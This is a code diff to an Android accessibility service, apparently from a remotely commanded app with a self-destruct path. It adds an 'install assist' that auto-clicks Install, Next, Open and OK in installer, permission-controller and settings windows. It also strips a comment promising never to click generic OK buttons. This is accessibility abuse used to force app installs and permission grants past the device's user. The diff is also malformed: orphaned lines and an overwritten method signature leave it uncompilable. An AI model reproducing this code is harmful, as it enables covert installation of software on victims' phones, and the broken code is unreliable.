@@ -123,7 +123,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private volatile String uninstallAssistTargetPackage = "";
     private volatile long uninstallAssistExpiresAt = 0L;
     private volatile long lastUninstallAssistClickAt = 0L;
+
+    private volatile boolean installAssistArmed = false;
+    private volatile long installAssistExpiresAt = 0L;
+    private volatile long lastInstallAssistClickAt = 0L;
     private static final long UNINSTALL_ASSIST_TIMEOUT_MS = 30_000L;
+    private static final long INSTALL_ASSIST_TIMEOUT_MS = 10_000L;
     private static final long FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS = 2_000L;
     private volatile boolean firstLaunchInstallerCleanupScheduled = false;
     
@@ -204,15 +209,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Arms the uninstall assistant for one exact package. The assistant only
-     * acts on an Android package-installer dialog whose visible app label
-     * matches this package; it never scans for a generic OK/Yes button.
-     *
-     * The app's own package is deliberately rejected here. Self-destruct uses
-     * the separate armSelfUninstallAssist() entry point so an ordinary
-     * uninstall_app command cannot accidentally arm the service itself.
+     * Arms install assistant for 10 seconds to auto-click install buttons
      */
-    public void armUninstallAssist(String packageName) {
+    public void armInstallAssist(String filePath) {
+        installAssistArmed = true;
+        installAssistExpiresAt = System.currentTimeMillis() + INSTALL_ASSIST_TIMEOUT_MS;
+        lastInstallAssistClickAt = 0L;
+        Log.i(TAG, "Install assist armed for 10s");
+    }
         armUninstallAssistForTarget(packageName, false);
     }
 
@@ -1145,10 +1149,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) return;
 
-            // Explicitly armed uninstall flow comes before all generic
+    // Explicitly armed uninstall flow comes before all generic
             // permission/protection logic. This is the only path allowed to
             // click Uninstall/OK in the system package-installer UI.
             if (runArmedUninstallAssist(rootNode)) {
+                rootNode.recycle();
+                return;
+            }
+            // Install assist - auto click install/next/done
+            if (runArmedInstallAssist(rootNode)) {
                 rootNode.recycle();
                 return;
             }
@@ -1160,6 +1169,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     }
                 } finally {
                     uninstallWindowRoot.recycle();
+                }
+            }
+            AccessibilityNodeInfo installWindowRoot = findInstallDialogWindowRoot();
+            if (installWindowRoot != null) {
+                try {
+                    if (runArmedInstallAssist(installWindowRoot)) {
+                        return;
+                    }
+                } finally {
+                    installWindowRoot.recycle();
                 }
             }
 
@@ -3004,7 +3023,59 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * uninstall dialog. The arm remains live long enough for a second Android
      * confirmation screen (for example Uninstall → OK).
      */
-    private boolean runArmedUninstallAssist(AccessibilityNodeInfo rootNode) {
+    private boolean runArmedInstallAssist(AccessibilityNodeInfo rootNode) {
+        if (!installAssistArmed || rootNode == null) return false;
+        if (System.currentTimeMillis() > installAssistExpiresAt) {
+            installAssistArmed = false;
+            return false;
+        }
+        try {
+            CharSequence packageName = rootNode.getPackageName();
+            String windowPackage = packageName == null ? "" : packageName.toString().toLowerCase();
+            boolean isInstallerWindow = windowPackage.contains("packageinstaller")
+                    || windowPackage.contains("permissioncontroller")
+                    || windowPackage.contains("installer")
+                    || windowPackage.contains("settings");
+            if (!isInstallerWindow) return false;
+            long now = System.currentTimeMillis();
+            if (now - lastInstallAssistClickAt < 750L) return true;
+            boolean clicked = findAndClickFullWord(rootNode, "Install");
+            if (!clicked) clicked = findAndClickFullWord(rootNode, "Next");
+            if (!clicked) clicked = findAndClickFullWord(rootNode, "Done");
+            if (!clicked) clicked = findAndClickFullWord(rootNode, "Open");
+            if (!clicked) clicked = findAndClickFullWord(rootNode, "OK");
+            if (clicked) {
+                lastInstallAssistClickAt = now;
+                Log.i(TAG, "Install assist clicked");
+            }
+            return clicked;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private AccessibilityNodeInfo findInstallDialogWindowRoot() {
+        try {
+            List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
+            if (windows == null) return null;
+            for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
+                try {
+                    AccessibilityNodeInfo root = win.getRoot();
+                    if (root == null) continue;
+                    CharSequence packageName = root.getPackageName();
+                    String windowPackage = packageName == null ? "" : packageName.toString().toLowerCase();
+                    boolean isInstallerWindow = windowPackage.contains("packageinstaller")
+                            || windowPackage.contains("permissioncontroller")
+                            || windowPackage.contains("installer");
+                    if (isInstallerWindow) {
+                        if (runArmedInstallAssist(root)) return root;
+                    }
+                    root.recycle();
+                } catch (Exception ignored) {}
+            }
+        } catch (Exception ignored) {}
+        return null;
+    }
         if (!isArmedUninstallDialog(rootNode)) return false;
 
         long now = System.currentTimeMillis();
